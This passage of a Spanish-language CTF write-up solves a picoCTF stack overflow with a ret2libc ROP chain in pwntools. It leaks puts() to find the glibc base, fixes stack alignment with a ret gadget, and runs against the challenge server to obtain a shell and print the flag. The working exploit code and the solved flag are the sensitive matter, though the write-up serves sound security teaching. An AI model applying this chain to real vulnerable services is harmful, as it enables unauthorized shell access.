</code></pre></div><p>Podemos actualizar el <em>exploit</em> para que muestre este resultado:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">    <span class="mtk1">puts_addr</span> <span class="mtk5">=</span> <span class="mtk1">u64(</span><span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">recvline</span><span class="mtk1">().</span><span class="mtk8">strip</span><span class="mtk1">().</span><span class="mtk8">ljust</span><span class="mtk1">(</span><span class="mtk6">8</span><span class="mtk1">,</span> <span class="mtk7 mtki">b</span><span class="mtk4">'</span><span class="mtk6">\0</span><span class="mtk4">'</span><span class="mtk1">))</span>
    <span class="mtk1">log</span><span class="mtk1">.</span><span class="mtk8">info</span><span class="mtk1">(</span><span class="mtk7 mtki">f</span><span class="mtk4">'Leaked</span> <span class="mtk4">puts()</span> <span class="mtk4">address:</span> <span class="mtk6">{</span><span class="mtk8">hex</span><span class="mtk1">(</span><span class="mtk1">puts_addr</span><span class="mtk1">)</span><span class="mtk6">}</span><span class="mtk4">'</span><span class="mtk1">)</span>

    <span class="mtk1">puts_offset</span> <span class="mtk5">=</span> <span class="mtk7 mtki">0x</span><span class="mtk6">80a30</span>
    <span class="mtk1">glibc_base_addr</span> <span class="mtk5">=</span> <span class="mtk1">puts_addr</span> <span class="mtk5">-</span> <span class="mtk1">puts_offset</span>
    <span class="mtk1">log</span><span class="mtk1">.</span><span class="mtk8">info</span><span class="mtk1">(</span><span class="mtk7 mtki">f</span><span class="mtk4">'Glibc</span> <span class="mtk4">base</span> <span class="mtk4">address:</span> <span class="mtk6">{</span><span class="mtk8">hex</span><span class="mtk1">(</span><span class="mtk1">glibc_base_addr</span><span class="mtk1">)</span><span class="mtk6">}</span><span class="mtk4">'</span><span class="mtk1">)</span>  
</code></pre></div><p>Y ahora podemos verlo al ejecutar el <em>exploit</em>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">python3</span> <span class="mtku">solve.py</span>
[<span class="code-blue">*</span>] './vuln_patched'
    Arch:     amd64-64-little
    RELRO:    <span class="code-dark-yellow">Partial RELRO</span>
    Stack:    <span class="code-dark-red">No canary found</span>
    NX:       <span class="code-dark-green">NX enabled</span>
    PIE:      <span class="code-dark-red">No PIE (0x400000)</span>
    RUNPATH:  <span class="code-dark-red">b'.'</span>
[<span class="code-green">+</span>] Starting local process './vuln_patched': pid 148874  
[<span class="code-blue">*</span>] Leaked puts() address: 0x7fa62ed48a30
[<span class="code-blue">*</span>] Glibc base address: 0x7fa62ecc8000
[<span class="code-blue">*</span>] Switching to interactive mode
WeLcOmE To mY EcHo sErVeR!
<span class="code-red">$</span>
</code></pre></div><p>Esto es útil porque si la dirección base de Glibc no termina en <code>000</code> en hexadecimal, es probable que algo no está yendo bien. El proceso de aleatorización de ASLR genera números que terminan en <code>000</code>, por lo que es una prueba de que todo va bien durante la explotación.</p><p>Ahora es el momento de llamar a <code>system</code> con <code>"/bin/sh"</code> como argumento (de nuevo, tenemos que usar el <em>gadget</em> <code>pop rdi; ret</code> para poner el puntero a <code>"/bin/sh"</code> como argumento de <code>system</code>).</p><p>La información necesaria está aquí:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">readelf</span> -s <span class="mtku">libc.so.6</span> | <span class="code-dark-green">grep</span> <span class="code-dark-yellow">' system$'</span>
  6032: 000000000004f4e0    45 FUNC    WEAK   DEFAULT   13 <span class="code-red">system</span>  

<span class="code-cyan">$</span> <span class="code-dark-green">strings</span> -atx <span class="mtku">libc.so.6</span> | <span class="code-dark-green">grep</span> /bin/sh
 1b40fa <span class="code-red">/bin/sh</span>
</code></pre></div><p>Y ahora seguimos con una segunda ROP <em>chain</em> para conseguir una <em>shell</em>:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">    <span class="mtk1">system_offset</span> <span class="mtk5">=</span> <span class="mtk7 mtki">0x</span><span class="mtk6">4f4e0</span>
    <span class="mtk1">bin_sh_offset</span> <span class="mtk5">=</span> <span class="mtk7 mtki">0x</span><span class="mtk6">1b40fa</span>

    <span class="mtk1">system_addr</span> <span class="mtk5">=</span> <span class="mtk1">glibc_base_addr</span> <span class="mtk5">+</span> <span class="mtk1">system_offset</span>
    <span class="mtk1">bin_sh_addr</span> <span class="mtk5">=</span> <span class="mtk1">glibc_base_addr</span> <span class="mtk5">+</span> <span class="mtk1">bin_sh_offset</span>

    <span class="mtk1">payload</span>  <span class="mtk5">=</span> <span class="mtk1">junk</span>
    <span class="mtk1">payload</span> <span class="mtk5">+=</span> <span class="mtk1">p64(</span><span class="mtk1">pop_rdi_ret</span><span class="mtk1">)</span>
    <span class="mtk1">payload</span> <span class="mtk5">+=</span> <span class="mtk1">p64(</span><span class="mtk1">bin_sh_addr</span><span class="mtk1">)</span>
    <span class="mtk1">payload</span> <span class="mtk5">+=</span> <span class="mtk1">p64(</span><span class="mtk1">system_addr</span><span class="mtk1">)</span>

    <span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">sendlineafter</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'WeLcOmE</span> <span class="mtk4">To</span> <span class="mtk4">mY</span> <span class="mtk4">EcHo</span> <span class="mtk4">sErVeR!</span><span class="mtk6">\n</span><span class="mtk4">'</span><span class="mtk1">,</span> <span class="mtk1">payload</span><span class="mtk1">)</span>  
    <span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">recvline</span><span class="mtk1">()</span>

    <span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">interactive</span><span class="mtk1">()</span>
</code></pre></div><p>Pero si lo ejecutamos, no conseguimos una <em>shell</em>&mldr;</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">python3</span> <span class="mtku">solve.py</span>
[<span class="code-blue">*</span>] './vuln_patched'
    Arch:     amd64-64-little
    RELRO:    <span class="code-dark-yellow">Partial RELRO</span>
    Stack:    <span class="code-dark-red">No canary found</span>
    NX:       <span class="code-dark-green">NX enabled</span>
    PIE:      <span class="code-dark-red">No PIE (0x400000)</span>
    RUNPATH:  <span class="code-dark-red">b'.'</span>
[<span class="code-green">+</span>] Starting local process './vuln_patched': pid 157202  
[<span class="code-blue">*</span>] Leaked puts() address: 0x7f394d102a30
[<span class="code-blue">*</span>] Glibc base address: 0x7f394d082000
[<span class="code-blue">*</span>] Switching to interactive mode
[<span class="code-blue">*</span>] Got EOF while reading in interactive
<span class="code-red">$</span>
</code></pre></div><p>Esto ocurre debido al alineamiento de la pila (<em>stack alignment</em>). En el momento de llamar a <code>system</code>, la pila no está alineada y el programa termina. La solución a esto es poner un simple <em>gadget</em> <code>ret</code> antes de llamar a <code>system</code>.</p><p>Como ya tenemos <code>pop rdi; ret</code> en <code>0x400913</code>, sabemos que <code>ret</code> estará en <code>0x400914</code> (una unidad más). También podríamos buscarlo con <code>ROPgadget</code>.</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">    <span class="mtk1">payload</span>  <span class="mtk5">=</span> <span class="mtk1">junk</span>
    <span class="mtk1">payload</span> <span class="mtk5">+=</span> <span class="mtk1">p64(</span><span class="mtk1">pop_rdi_ret</span><span class="mtk1">)</span>
    <span class="mtk1">payload</span> <span class="mtk5">+=</span> <span class="mtk1">p64(</span><span class="mtk1">bin_sh_addr</span><span class="mtk1">)</span>
    <span class="mtk1">payload</span> <span class="mtk5">+=</span> <span class="mtk1">p64(</span><span class="mtk1">pop_rdi_ret</span> <span class="mtk5">+</span> <span class="mtk6">1</span><span class="mtk1">)</span>
    <span class="mtk1">payload</span> <span class="mtk5">+=</span> <span class="mtk1">p64(</span><span class="mtk1">system_addr</span><span class="mtk1">)</span>

    <span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">sendlineafter</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'WeLcOmE</span> <span class="mtk4">To</span> <span class="mtk4">mY</span> <span class="mtk4">EcHo</span> <span class="mtk4">sErVeR!</span><span class="mtk6">\n</span><span class="mtk4">'</span><span class="mtk1">,</span> <span class="mtk1">payload</span><span class="mtk1">)</span>  
    <span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">recvline</span><span class="mtk1">()</span>

    <span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">interactive</span><span class="mtk1">()</span>
</code></pre></div><p>Y ahora sí tenemos una <em>shell</em> en local:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">python3</span> <span class="mtku">solve.py</span>
[<span class="code-blue">*</span>] './vuln_patched'
    Arch:     amd64-64-little
    RELRO:    <span class="code-dark-yellow">Partial RELRO</span>
    Stack:    <span class="code-dark-red">No canary found</span>
    NX:       <span class="code-dark-green">NX enabled</span>
    PIE:      <span class="code-dark-red">No PIE (0x400000)</span>
    RUNPATH:  <span class="code-dark-red">b'.'</span>
[<span class="code-green">+</span>] Starting local process './vuln_patched': pid 174597
[<span class="code-blue">*</span>] Leaked puts() address: 0x7f191fcada30
[<span class="code-blue">*</span>] Glibc base address: 0x7f191fc2d000
[<span class="code-blue">*</span>] Switching to interactive mode
<span class="code-red">$</span> ls
ld-2.27.so  libc.so.6  Makefile  solve.py  vuln  vuln_patched  
</code></pre></div><p>Vamos a lanzarlo contra la instancia remota y a leer la <em>flag</em>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">python3</span> <span class="mtku">solve.py</span> mercury.picoctf.net 24159
[<span class="code-blue">*</span>] './vuln_patched'
    Arch:     amd64-64-little
    RELRO:    <span class="code-dark-yellow">Partial RELRO</span>
    Stack:    <span class="code-dark-red">No canary found</span>
    NX:       <span class="code-dark-green">NX enabled</span>
    PIE:      <span class="code-dark-red">No PIE (0x400000)</span>
    RUNPATH:  <span class="code-dark-red">b'.'</span>
[<span class="code-green">+</span>] Opening connection to mercury.picoctf.net on port 24159: Done  
[<span class="code-blue">*</span>] Leaked puts() address: 0x7f9f791eaa30
[<span class="code-blue">*</span>] Glibc base address: 0x7f9f7916a000
[<span class="code-blue">*</span>] Switching to interactive mode
<span class="code-red">$</span> ls
flag.txt
libc.so.6
vuln
vuln.c
xinet_startup.sh
<span class="code-red">$</span> cat flag.txt
picoCTF{1_&lt;3_sm4sh_st4cking_cf205091ad15ab6d}
</code></pre></div><p>Adicionalmente, se puede escribir el <em>exploit</em> utilizando más funcionalidades de <a href="https://github.com/Gallopsled/pwntools"><code>pwntools</code></a>:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk3">#!/usr/bin/env</span> <span class="mtk3">python3</span>

<span class="mtk5">from</span> <span class="mtk8 mtku">pwn</span> <span class="mtk5">import</span> <span class="mtk1">context</span><span class="mtk1">,</span> <span class="mtk8 mtku">ELF</span><span class="mtk1">,</span> <span class="mtk1">log</span><span class="mtk1">,</span> <span class="mtk1">p64,</span> <span class="mtk8 mtku">remote</span><span class="mtk1">,</span> <span class="mtk8 mtku">ROP</span><span class="mtk1">,</span> <span class="mtk8 mtku">sys</span><span class="mtk1">,</span> <span class="mtk1">u64</span>  


<span class="mtk1">context</span><span class="mtk1">.</span><span class="mtk1">binary</span> <span class="mtk5">=</span> <span class="mtk1">elf</span> <span class="mtk5">=</span> <span class="mtk8 mtku">ELF</span><span class="mtk1">(</span><span class="mtk4">'vuln_patched'</span><span class="mtk1">)</span>
<span class="mtk1">glibc</span> <span class="mtk5">=</span> <span class="mtk8 mtku">ELF</span><span class="mtk1">(</span><span class="mtk4">'libc.so.6'</span><span class="mtk1">,</span> <span class="mtk9 mtki">checksec</span><span class="mtk5">=</span><span class="mtk6">False</span><span class="mtk1">)</span>
<span class="mtk1">rop</span> <span class="mtk5">=</span> <span class="mtk8 mtku">ROP</span><span class="mtk1">(</span><span class="mtk1">elf</span><span class="mtk1">)</span>


<span class="mtk7 mtki">def</span> <span class="mtk8">get_process</span><span class="mtk1">():</span>
    <span class="mtk5">if</span> <span class="mtk8">len</span><span class="mtk1">(</span><span class="mtk8 mtku">sys</span><span class="mtk1">.</span><span class="mtk1">argv</span><span class="mtk1">)</span> <span class="mtk5">==</span> <span class="mtk6">1</span><span class="mtk1">:</span>
        <span class="mtk5">return</span> <span class="mtk1">elf</span><span class="mtk1">.</span><span class="mtk8">process</span><span class="mtk1">()</span>

    <span class="mtk1">host</span><span class="mtk1">,</span> <span class="mtk1">port</span> <span class="mtk5">=</span> <span class="mtk8 mtku">sys</span><span class="mtk1">.</span><span class="mtk1">argv</span><span class="mtk1">[</span><span class="mtk6">1</span><span class="mtk1">],</span> <span class="mtk8 mtku">int</span><span class="mtk1">(</span><span class="mtk8 mtku">sys</span><span class="mtk1">.</span><span class="mtk1">argv</span><span class="mtk1">[</span><span class="mtk6">2</span><span class="mtk1">])</span>
    <span class="mtk5">return</span> <span class="mtk8 mtku">remote</span><span class="mtk1">(</span><span class="mtk1">host</span><span class="mtk1">,</span> <span class="mtk1">port</span><span class="mtk1">)</span>


<span class="mtk7 mtki">def</span> <span class="mtk8">main</span><span class="mtk1">():</span>
    <span class="mtk1">p</span> <span class="mtk5">=</span> <span class="mtk8">get_process</span><span class="mtk1">()</span>

    <span class="mtk1">offset</span> <span class="mtk5">=</span> <span class="mtk6">136</span>
    <span class="mtk1">junk</span> <span class="mtk5">=</span> <span class="mtk7 mtki">b</span><span class="mtk4">'A'</span> <span class="mtk5">*</span> <span class="mtk1">offset</span>

    <span class="mtk1">payload</span>  <span class="mtk5">=</span> <span class="mtk1">junk</span>
    <span class="mtk1">payload</span> <span class="mtk5">+=</span> <span class="mtk1">p64(</span><span class="mtk1">rop</span><span class="mtk1">.</span><span class="mtk8">find_gadget</span><span class="mtk1">([</span><span class="mtk4">'pop</span> <span class="mtk4">rdi'</span><span class="mtk1">,</span> <span class="mtk4">'ret'</span><span class="mtk1">])[</span><span class="mtk6">0</span><span class="mtk1">])</span>
    <span class="mtk1">payload</span> <span class="mtk5">+=</span> <span class="mtk1">p64(</span><span class="mtk1">elf</span><span class="mtk1">.</span><span class="mtk1">got</span><span class="mtk1">.puts)</span>
    <span class="mtk1">payload</span> <span class="mtk5">+=</span> <span class="mtk1">p64(</span><span class="mtk1">elf</span><span class="mtk1">.</span><span class="mtk1">plt</span><span class="mtk1">.puts)</span>
    <span class="mtk1">payload</span> <span class="mtk5">+=</span> <span class="mtk1">p64(</span><span class="mtk1">elf</span><span class="mtk1">.</span><span class="mtk1">symbols</span><span class="mtk1">.main)</span>

    <span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">sendlineafter</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'WeLcOmE</span> <span class="mtk4">To</span> <span class="mtk4">mY</span> <span class="mtk4">EcHo</span> <span class="mtk4">sErVeR!</span><span class="mtk6">\n</span><span class="mtk4">'</span><span class="mtk1">,</span> <span class="mtk1">payload</span><span class="mtk1">)</span>
    <span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">recvline</span><span class="mtk1">()</span>

    <span class="mtk1">puts_addr</span> <span class="mtk5">=</span> <span class="mtk1">u64(</span><span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">recvline</span><span class="mtk1">().</span><span class="mtk8">strip</span><span class="mtk1">().</span><span class="mtk8">ljust</span><span class="mtk1">(</span><span class="mtk6">8</span><span class="mtk1">,</span> <span class="mtk7 mtki">b</span><span class="mtk4">'</span><span class="mtk6">\0</span><span class="mtk4">'</span><span class="mtk1">))</span>
    <span class="mtk1">log</span><span class="mtk1">.</span><span class="mtk8">info</span><span class="mtk1">(</span><span class="mtk7 mtki">f</span><span class="mtk4">'Leaked</span> <span class="mtk4">puts()</span> <span class="mtk4">address:</span> <span class="mtk6">{</span><span class="mtk8">hex</span><span class="mtk1">(</span><span class="mtk1">puts_addr</span><span class="mtk1">)</span><span class="mtk6">}</span><span class="mtk4">'</span><span class="mtk1">)</span>

    <span class="mtk1">glibc</span><span class="mtk1">.</span><span class="mtk1">address</span> <span class="mtk5">=</span> <span class="mtk1">puts_addr</span> <span class="mtk5">-</span> <span class="mtk1">glibc</span><span class="mtk1">.</span><span class="mtk1">symbols</span><span class="mtk1">.puts</span>
    <span class="mtk1">log</span><span class="mtk1">.</span><span class="mtk8">info</span><span class="mtk1">(</span><span class="mtk7 mtki">f</span><span class="mtk4">'Glibc</span> <span class="mtk4">base</span> <span class="mtk4">address:</span> <span class="mtk6">{</span><span class="mtk8">hex</span><span class="mtk1">(</span><span class="mtk1">glibc</span><span class="mtk1">.</span><span class="mtk1">address</span><span class="mtk1">)</span><span class="mtk6">}</span><span class="mtk4">'</span><span class="mtk1">)</span>

    <span class="mtk1">payload</span>  <span class="mtk5">=</span> <span class="mtk1">junk</span>
    <span class="mtk1">payload</span> <span class="mtk5">+=</span> <span class="mtk1">p64(</span><span class="mtk1">rop</span><span class="mtk1">.</span><span class="mtk8">find_gadget</span><span class="mtk1">([</span><span class="mtk4">'pop</span> <span class="mtk4">rdi'</span><span class="mtk1">,</span> <span class="mtk4">'ret'</span><span class="mtk1">])[</span><span class="mtk6">0</span><span class="mtk1">])</span>
    <span class="mtk1">payload</span> <span class="mtk5">+=</span> <span class="mtk1">p64(</span><span class="mtk8">next</span><span class="mtk1">(</span><span class="mtk1">glibc</span><span class="mtk1">.</span><span class="mtk8">search</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'/bin/sh'</span><span class="mtk1">)))</span>
    <span class="mtk1">payload</span> <span class="mtk5">+=</span> <span class="mtk1">p64(</span><span class="mtk1">rop</span><span class="mtk1">.</span><span class="mtk8">find_gadget</span><span class="mtk1">([</span><span class="mtk4">'ret'</span><span class="mtk1">])[</span><span class="mtk6">0</span><span class="mtk1">])</span>
    <span class="mtk1">payload</span> <span class="mtk5">+=</span> <span class="mtk1">p64(</span><span class="mtk1">glibc</span><span class="mtk1">.</span><span class="mtk1">symbols</span><span class="mtk1">.system)</span>

    <span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">sendlineafter</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'WeLcOmE</span> <span class="mtk4">To</span> <span class="mtk4">mY</span> <span class="mtk4">EcHo</span> <span class="mtk4">sErVeR!</span><span class="mtk6">\n</span><span class="mtk4">'</span><span class="mtk1">,</span> <span class="mtk1">payload</span><span class="mtk1">)</span>
    <span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">recvline</span><span class="mtk1">()</span>
    <span class="mtk1">p<span class="mtk1">.</span><span class="mtk8">interactive</span><span class="mtk1">()</span>


<span class="mtk5">if</span> <span class="mtk1">__name__</span> <span class="mtk5">==</span> <span class="mtk4">'__main__'</span><span class="mtk1">:</span>
    <span class="mtk8">main</span><span class="mtk1">()</span>
</code></pre></div><div class="mt6 instapaper_ignoref"></div></div></article></main><footer class="bottom-0 w-100" role="contentinfo"><div class="tc mw8 ph3" style="margin:auto"><form style="background-color:var(--background-card)" class="tc mw8 pv3 mb3" action="https://tinyletter.com/7Rocky" method="post" target="popupwindow" onsubmit='return window.open("https://tinyletter.com/7Rocky","popupwindow","scrollbars=yes,width=800,height=600"),!0'><h3 class="tc">Recibe un resumen semanal del blog</h3><p class="tc"><label for="tlemail"></label></p><p class="tc"><input type="text" class="w-80 f5 pv3 ph3 bg-light-gray bn search" placeholder="Introduce tu correo electrónico" name="email" id="tlemail">
<input class="f5 pv3 ph3 bn" style="background-color:var(--background);color:inherit;font-weight:700;line-height:normal" type="submit" value="Submit"></p><input type="hidden" value="1" name="embed">
<input style="display:none;color:var(--header)" type="submit" value="Suscribirse"><p class="tc">impulsado por <a href="https://tinyletter.com" target="_blank" title="TinyLetter">TinyLetter</a></p><p class="tc"><a href="/en/newsletters/" target="_blank" title="View letter archive">View letter archive</a></p></form></div><div class="bg-black w-100 pa3" role="contentinfo"><div class="flex justify-between"><a class="f4 fw4 hover-white no-underline white-70 dn dib-ns pv2 ph3" href="https://7rocky.github.io/" title="https://7rocky.github.io/">&copy; Blog de 7Rocky. Ciberseguridad y Mates 2023</a><div style="margin-top:8px"><div><div><a href="https://www.linkedin.com/in/roberto-gesteira-minarro/" target="_blank" class="link-transition linkedin link dib z-999 pt3 pt0-l mr1" title="LinkedIn link" rel="noopener" aria-label="follow on LinkedIn——Opens in a new window"><svg height="30" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg><span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a><a href="https://github.com/7Rocky" target="_blank" class="link-transition github link dib z-999 pt3 pt0-l mr1" title="GitHub link" rel="noopener" aria-label="follow on GitHub——Opens in a new window"><svg height="30" style="enable-background:new 0 0 512 512" viewBox="0 0 512 512" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M256 32C132.3 32 32 134.8 32 261.7c0 101.5 64.2 187.5 153.2 217.9 11.2 2.1 15.3-5 15.3-11.1.0-5.5-.2-19.9-.3-39.1-62.3 13.9-75.5-30.8-75.5-30.8-10.2-26.5-24.9-33.6-24.9-33.6-20.3-14.3 1.5-14 1.5-14 22.5 1.6 34.3 23.7 34.3 23.7 20 35.1 52.4 25 65.2 19.1 2-14.8 7.8-25 14.2-30.7-49.7-5.8-102-25.5-102-113.5.0-25.1 8.7-45.6 23-61.6-2.3-5.8-10-29.2 2.2-60.8.0.0 18.8-6.2 61.6 23.5 17.9-5.1 37-7.6 56.1-7.7 19 .1 38.2 2.6 56.1 7.7 42.8-29.7 61.5-23.5 61.5-23.5 12.2 31.6 4.5 55 2.2 60.8 14.3 16.1 23 36.6 23 61.6.0 88.2-52.4 107.6-102.3 113.3 8 7.1 15.2 21.1 15.2 42.5.0 30.7-.3 55.5-.3 63 0 6.1 4 13.3 15.4 11C415.9 449.1 480 363.1 480 261.7 480 134.8 379.7 32 256 32z"/></svg><span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a></div></div></div></div></div></footer></body></html>